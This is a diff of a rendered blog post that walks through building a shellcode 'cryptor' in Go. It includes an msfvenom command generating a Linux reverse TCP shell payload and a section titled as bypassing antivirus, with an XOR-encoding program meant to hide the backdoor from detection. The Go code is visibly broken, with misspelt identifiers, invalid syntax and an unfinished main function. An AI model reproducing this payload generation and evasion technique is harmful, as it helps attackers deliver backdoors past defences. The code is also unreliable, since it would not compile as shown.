@@ -1,4 +1,4 @@
-I"7"<p>In this blogpost we will write an custom Shellcode Cryptor in go.</p>
+I"‘8<p>In this blogpost we will write an custom Shellcode Cryptor in go.</p>
 
 <h2 id="but-what-exactly-is-shellcode">But what exactly is Shellcode?</h2>
 <p>Shellcode is a combination of binary instruction that will be executed on cpu.
@@ -87,7 +87,62 @@ file.c	raw.txt  runme
 To run the Shellcode you have todo the same as before, just copy the output, paste, rename the array, compile and run.</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p linux/x86/shell/reverse_tcp LHOST=127.0.0.1 LPORT=8089 -b "\x00" -f c -o raw.txt 
 </code></pre></div></div>
-<p>For some reason msfvenom used shikata_ga_nai, but i didnt specify to use it which was really suprising for me. If we now upload the backdoor to VirusTotal it will be detected.
-<img src="/_posts/images/crop.png" alt="Virus Total Screenshot here" /></p>
+<p>For some reason msfvenom used shikata_ga_nai, but i didnt specify to use it which was really suprising for me. If we now upload the backdoor to VirusTotal it will be detected as we see here.</p>
+
+<p><img src="https://github.com/calloczero/calloczero.github.io/blob/main/_images/crop.png?raw=true" alt="VirusTotal Screenshot" /></p>
+
+<h1 id="writing-an-encryptor-to-obfucate-and-bypass-antivirus-software">Writing an Encryptor to obfucate and bypass Antivirus-Software</h1>
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span> <span class="c">/* package declaration */</span>
+<span class="k">import</span> <span class="p">(</span>
+	<span class="s">"io/ioutil"</span>
+	<span class="s">"strconv"</span>
+	<span class="s">"fmt"</span>
+	<span class="s">"os"</span>
+	<span class="p">)</span>
+
+<span class="c">/* read bytes raw bytes */</span>
+<span class="k">func</span> <span class="n">ReadBytes</span><span class="p">(</span><span class="n">filepath</span> <span class="kt">string</span><span class="p">)</span> <span class="p">(</span><span class="n">fbytes</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">fbytes</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">ioutil</span><span class="o">.</span><span class="n">Readfile</span><span class="p">(</span><span class="n">filpath</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+		<span class="n">fmt</span><span class="o">.</span><span class="n">Fprintf</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">Stderr</span><span class="p">,</span> <span class="s">"[*]Could not read file</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+	<span class="p">}</span>
+	<span class="k">return</span> 
+<span class="p">}</span>
+
+<span class="c">/* xor bytes */</span>
+<span class="k">func</span> <span class="n">XorBytes</span><span class="p">(</span><span class="n">data</span> <span class="kt">byte</span><span class="p">[]),</span> <span class="n">key</span> <span class="kt">byte</span><span class="p">)</span> <span class="p">[]</span><span class="kt">byte</span> <span class="p">{</span>
+	<span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">v</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">data</span> <span class="p">{</span>
+		<span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span> <span class="o">^</span> <span class="n">key</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="n">data</span>
+<span class="p">}</span>
+
+<span class="k">func</span> <span class="n">PrintByteArray</span><span class="p">(</span><span class="n">data</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">v</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">data</span> <span class="p">{</span>
+		<span class="k">if</span> <span class="n">i</span><span class="o">%</span><span class="m">15</span> <span class="o">==</span> <span class="m">0</span> <span class="o">&amp;&amp;</span> <span class="n">i</span> <span class="o">!=</span> <span class="m">0</span> <span class="p">{</span>
+			<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
+		<span class="p">}</span>
+		<span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">x%x"</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
+	<span class="p">}</span>
+	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
+<span class="p">}</span>
+
+<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>		
+	<span class="c">/* check if commandline arguments given */</span>
+	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">Args</span><span class="p">)</span> <span class="o">&lt;</span> <span class="m">3</span> <span class="p">{</span>
+		<span class="n">fmt</span><span class="o">.</span><span class="n">Fprintf</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">Stderr</span><span class="p">,</span> <span class="s">"[*]Usage: &lt;raw.txt&gt; &lt;key&gt;</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+	<span class="p">}</span>
+	
+	<span class="c">/* read shellcode */</span>
+	<span class="n">fbytes</span> <span class="o">:=</span> <span class="n">ReadBytes</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">Args</span><span class="p">[</span><span class="m">1</span><span class="p">])</span> 
+	
+	<span class="c">/* encode bytes */</span>
+	<span class="n">fbytes</span> <span class="o">:=</span> <span class="n">XorBytes</span><span class="p">(</span><span class="n">fbytes</span><span class="p">,</span> <span class="n">strconv</span><span class="o">.</span><span class="n">Atoi</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">Args</span><span class="p">[</span><span class="m">3</span><span class="p">]))</span>
+
+
+<span class="p">}</span>
+
+
+</code></pre></div></div>
 
 :ET
